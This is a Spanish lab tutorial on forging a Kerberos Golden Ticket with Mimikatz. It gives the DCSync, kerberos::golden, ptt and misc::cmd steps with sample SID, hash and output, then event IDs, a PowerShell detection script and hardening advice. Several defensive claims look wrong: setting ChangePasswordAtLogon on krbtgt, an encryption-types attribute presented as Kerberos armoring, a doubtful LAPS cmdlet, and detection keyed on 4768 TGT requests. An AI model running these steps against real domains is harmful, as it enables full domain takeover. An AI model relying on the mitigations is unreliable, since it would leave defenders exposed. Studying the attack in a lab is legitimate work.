# Golden Ticket (Kerberos Authentication Abuse)

> ⚠️ Fines educativos, laboratorio aislado — ver disclaimer completo en el [README](../README.md).

## Resumen del ataque

Un **Golden Ticket** es un ticket Kerberos falso pero válido que se crea usando el hash NTLM de la cuenta `krbtgt`. Con este ticket, un atacante puede **suplantar cualquier usuario del dominio, incluido Domain Admin, de forma permanente**.

Es el ataque más peligroso post-DCSync porque:
- No requiere la contraseña real
- Solo necesita el hash de krbtgt
- El ticket es válido por **10 años** (por defecto)
- No genera alertas de cambio de contraseña
- Funciona incluso si los admins cambian todas las contraseñas

**Realismo**: Extremadamente alto. Después de DCSync, el Golden Ticket es el ataque preferido.

**Impacto**: CRÍTICO. Con un Golden Ticket válido, eres **Domain Admin permanentemente**.

---

## Objetivo del ataque

Demostrar cómo usar el hash de `krbtgt` (obtenido mediante DCSync) para crear un ticket Kerberos falso que permita acceder al dominio como **Administrador sin su contraseña**.

---

## Escenario del lab

```
Dominio:           adlab.local
SID del dominio:   S-1-5-21-3823122521-1313580667-2699790469
Hash krbtgt:       9a67389e0abcf592e62449d1d140c4ec (obtenido de DCSync)
Usuario a suplantar: Administrador
Herramienta:       Mimikatz
Evidencia:         Event ID 4768, 4769, 4776
```

---

## Paso 1 — Obtener hash de krbtgt (DCSync)

**Ver**: [07 - DCSync](./07_DCSync.md) para aprender cómo extraer el hash de `krbtgt` usando Mimikatz.

### Resumen rápido:

En **Mimikatz**:

```
lsadump::dcsync /domain:adlab.local /user:krbtgt
```

Esto devuelve:

```
Credentials:
Hash NTLM: 9a67389e0abcf592e62449d1d140c4ec
```

![Ejecutando lsadump::dcsync desde mimikatz y obteniendo el hash NTLM de krbtgt](<img/usamos mimikatz y vemos hash.png>)

**¡¡Este hash es la llave maestra del dominio!!**

---

## Paso 2 — Obtener datos necesarios

### 2.1 SID del dominio

En **PowerShell en JORGE-CLIENTE**:

```powershell
Get-ADDomain | Select-Object DomainSID
```

Resultado:
```
S-1-5-21-3823122521-1313580667-2699790469
```

### 2.2 Usuario a suplantar

En un dominio en **español**, la cuenta admin se llama: **Administrador** (no Administrator)

En inglés sería: **Administrator**

---

## Paso 3 — Crear Golden Ticket con Mimikatz

En **JORGE-CLIENTE**, abre PowerShell en `C:\Tools\mimikatz\x64\`:

```
.\mimikatz.exe
```

**Dentro de Mimikatz**, ejecuta (EXACTAMENTE IGUAL):

```
kerberos::golden /domain:adlab.local /sid:S-1-5-21-3823122521-1313580667-2699790469 /krbtgt:9a67389e0abcf592e62449d1d140c4ec /user:Administrador /ticket:golden_final.kirbi
```

**Salida esperada:**

```
User            : Administrador
Domain          : adlab.local (ADLAB)
SID             : S-1-5-21-3823122521-1313580667-2699790469
User Id         : 500
Groups Id       : *513 512 520 518 519 ← Grupos ADMIN
ServiceKey      : 9a67389e0abcf592e62449d1d140c4ec
Lifetime        : 11/07/2026 23:53:31 ; 7/8/2036 23:53:31 ← ¡¡10 AÑOS!!
→ Ticket        : golden_final.kirbi

Final Ticket Saved to file!
```

![Generando el Golden Ticket con kerberos::golden en mimikatz, con lifetime de 10 años](<img/generamos golden ticket.png>)

---

## Paso 4 — Inyectar el ticket en memoria

**Dentro de Mimikatz**, ejecuta:

```
kerberos::ppt golden_final.kirbi
```

**Salida**: `File: 'golden_final.kirbi': OK`

Ahora el ticket está **inyectado en el cache Kerberos** de Mimikatz.

---

## Paso 5 — Usar el ticket (abrir shell heredada)

**Dentro de Mimikatz**, ejecuta:

```
misc::cmd
```

Eso abre una **CMD nueva** que **hereda el ticket Golden inyectado**.

---

## Paso 6 — Verificar que eres Admin

**En esa CMD nueva heredada**, ejecuta:

```
klist
```

**Debería mostrar:**

```
Vales almacenados en caché: (1)

[0]	Cliente: administrador @ adlab.local
	Servidor: krbtgt/adlab.local @ adlab.local
	Hora de inicio: 7/11/2026 23:53:31
	Hora de finalización: 7/8/2036 23:53:31
	Marcas de caché: 0x1 -> PRIMARY
```

![klist mostrando el vale de administrador cargado en la sesión CMD heredada](<img/vemos que tenemos cargado el goldenticket en sesion cmd.png>)

**¡¡EL TICKET ESTÁ INYECTADO Y ACTIVO!!**

### Prueba de admin:

```
net view \\100.100.100.50
```

Si ves las compartidas (NETLOGON, Scripts, SYSVOL), **¡¡ERES ADMIN!!**

![net view contra DC01 mostrando las compartidas administrativas, confirmando el privilegio de Domain Admin](<img/evidencia de privilegio.png>)

---

## Paso 7 — Indicadores de Compromiso (IoCs)

### Event ID 4768 — TGT Request (Ticket Granting Ticket)

Se genera cuando se solicita un TGT de Kerberos. **El Golden Ticket dispara estos eventos**.

```
Event ID: 4768
Categoría: Kerberos Authentication Service
Descripción: "Se solicitó un vale de autenticación (TGT) de Kerberos"

Señales de alarma:
  - Solicitud de TGT a krbtgt
  - Desde cliente remoto (IP inesperada)
  - Usuario normal solicita TGT
  - Múltiples solicitudes TGT seguidas
```

![Evento 4768 en el Visor de eventos de DC01 tras usar el Golden Ticket](<img/log evento 4768.png>)

### Event ID 4769 — Service Ticket Request

Se genera cuando se solicita acceso a un servicio Kerberos.

```
Event ID: 4769
Descripción: "Se solicitó un vale de servicio de Kerberos"

Señales de alarma:
  - Solicitudes de tickets a servicios (CIFS, HOST, etc.)
  - Desde IPs inesperadas
  - Solicitudes a múltiples servicios rápidamente
```

![Evento 4769 en el Visor de eventos de DC01 tras acceder a un recurso con el Golden Ticket](<img/log evento 4769.png>)

### Event ID 4776 — NTLM Logon

Se genera cuando hay autenticación NTLM. Puede aparecer junto con Golden Ticket si usa NTLM.

```
Event ID: 4776
Descripción: "Se intentó validar las credenciales de una cuenta"
```

![Evento 4776 en el Visor de eventos de DC01 asociado al uso del Golden Ticket](<img/log evento 4776.png>)

---

## Paso 8 — Habilito la auditoría de autenticación Kerberos

Para que los eventos 4768/4769/4776 se generen hace falta activar la auditoría de "Kerberos Authentication Service" y "Kerberos Service Ticket Operations" en la GPO del dominio.

![Configurando en la GPO las subcategorías de auditoría de Kerberos en Aciertos y errores para que se generen los eventos 4768, 4769 y 4776](<img/Activamos directivas en GPO para recoger logs.png>)

---

## Detección en tiempo real

**Los Golden Tickets son difíciles de detectar porque usan el protocolo legítimo de Kerberos**. Sin embargo, hay indicadores:

1. **Múltiples Event ID 4768 desde una IP inesperada** → Posible Golden Ticket
2. **Solicitud de TGT a krbtgt** → Anómalo (solo DCs deberían hacerlo)
3. **Tickets válidos por 10 años** → Sospechoso (normal es 8 horas)
4. **Usuario sin contraseña reciente accediendo como admin** → Event 4768 sin cambio de contraseña

---

## Script de Detección PowerShell

```powershell
# Detect-GoldenTicket.ps1
# Detecta indicios de Golden Ticket mediante Event ID 4768, 4769 y 4776

param(
    [int]$HoursBack = 24,
    [string]$OutputPath = "C:\Reports"
)

Write-Host "[*] Buscando indicios de Golden Ticket..." -ForegroundColor Cyan
Write-Host "[*] Período: $HoursBack horas" -ForegroundColor Cyan
Write-Host ""

$startTime = (Get-Date).AddHours(-$HoursBack)

# Event ID 4768: solicitudes de TGT (posible TGT a krbtgt)
$events4768 = Get-WinEvent -FilterHashtable @{
    LogName = "Security"; ID = 4768; StartTime = $startTime
} -ErrorAction SilentlyContinue

$suspiciousTGT = @()
foreach ($event in $events4768) {
    $xml = [xml]$event.ToXml()
    $eventData = $xml.Event.EventData.Data

    $user        = ($eventData | Where-Object {$_.Name -eq "TargetUserName"}).InnerText
    $serviceName = ($eventData | Where-Object {$_.Name -eq "ServiceName"}).InnerText

    if ($serviceName -match "krbtgt" -or $user -match "krbtgt") {
        $suspiciousTGT += [PSCustomObject]@{
            Time    = $event.TimeCreated
            User    = $user
            Service = $serviceName
        }
    }
}

if ($suspiciousTGT.Count -eq 0) {
    Write-Host "✓ No se detectaron indicios de Golden Ticket" -ForegroundColor Green
} else {
    Write-Host "🔴 [CRÍTICA] POSIBLE GOLDEN TICKET DETECTADO" -ForegroundColor Red
    Write-Host "   Total de solicitudes TGT sospechosas: $($suspiciousTGT.Count)" -ForegroundColor Red
    Write-Host ""

    foreach ($attempt in $suspiciousTGT) {
        Write-Host "   Hora: $($attempt.Time)" -ForegroundColor Red
        Write-Host "   Usuario: $($attempt.User)" -ForegroundColor Red
        Write-Host "   Servicio: $($attempt.Service)" -ForegroundColor Red
        Write-Host ""
    }
}

# Guardar reporte
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

$reportFile = Join-Path $OutputPath "GoldenTicket_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').csv"
$suspiciousTGT | Export-Csv -Path $reportFile -NoTypeInformation

Write-Host "Reporte guardado en: $reportFile" -ForegroundColor Green
```

**Uso:**
```powershell
.\Detect-GoldenTicket.ps1 -HoursBack 24
```

> La versión completa del script (con parseo de 4768, 4769 y 4776, y correlación de indicadores) está en [`Detect-GoldenTicket.ps1`](Detect-GoldenTicket.ps1).

---

## Mitigación y Hardening

### 1. Cambiar contraseña de krbtgt (difícil pero efectivo)

Si se sospecha que krbtgt ha sido comprometido:

```powershell
# Cambiar contraseña de krbtgt
Set-ADUser krbtgt -ChangePasswordAtLogon $true
```

**IMPORTANTE**: Hacer esto invalida TODOS los Golden Tickets existentes.

### 2. Monitorear cambios en krbtgt

```powershell
auditpol /set /subcategory:"Account Management" /success:enable /failure:enable
```

### 3. Auditar Event ID 4768/4769

Cualquier solicitud TGT debería ser monitoreada y alertada.

### 4. Implementar LAPS (Local Administrator Password Solution)

Cambiar contraseñas de admin regularmente:

```powershell
Install-AdmPwdPasswordPolicy
```

### 5. Usar Kerberos Armoring (FAST)

Protege contra falsificación de tickets:

```powershell
# Habilitar en GPO
Set-ADObject -Identity (Get-ADDomainController).ComputerObjectDN -Add @{"msDS-SupportedEncryptionTypes"=24}
```

### 6. Deshabilitar NTLM

Kerberos es más seguro:

```
Restrict NTLM: Deny All
```

---

## Notas importantes

1. **No es un exploit de software** — El Golden Ticket abusa del protocolo LEGÍTIMO de Kerberos. El "exploit" es tener el hash de krbtgt.

2. **Imposible de revocar rápidamente** — Un ticket válido por 10 años no puede ser revocado sin cambiar la contraseña de krbtgt.

3. **Dejar rastro mínimo** — Los Event IDs se generan, pero no son tan claros como un cambio de contraseña.

4. **Combina con DCSync** — Para tener ticket permanente, primero necesitas DCSync para obtener el hash de krbtgt.

5. **Post-explotación definitiva** — Una vez tienes un Golden Ticket válido, eres admin del dominio indefinidamente (mientras no cambien krbtgt).

---

## Comparación: Golden Ticket vs Pass-the-Hash vs Pass-the-Ticket

```
                  Golden Ticket    Pass-the-Hash    Pass-the-Ticket (TGT)
Requiere          krbtgt hash      Cualquier hash   TGT válido
Duración          10 años          Mientras valid   8 horas (defecto)
Detectabilidad    Media            Alta             Media
Revocabilidad     Cambiar krbtgt   Cambiar contraseña Cambiar contraseña
Persistencia      MUY ALTA         Baja             Media
```

---

## Referencias

- [Microsoft: Event ID 4768](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [Microsoft: Event ID 4769](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz)
- [SANS: Kerberos Golden Tickets](https://www.sans.org/white-papers/)

---

**Estado**: Completado  
**Evidencia generada**: Event ID 4768, 4769, 4776 (Kerberos Authentication)
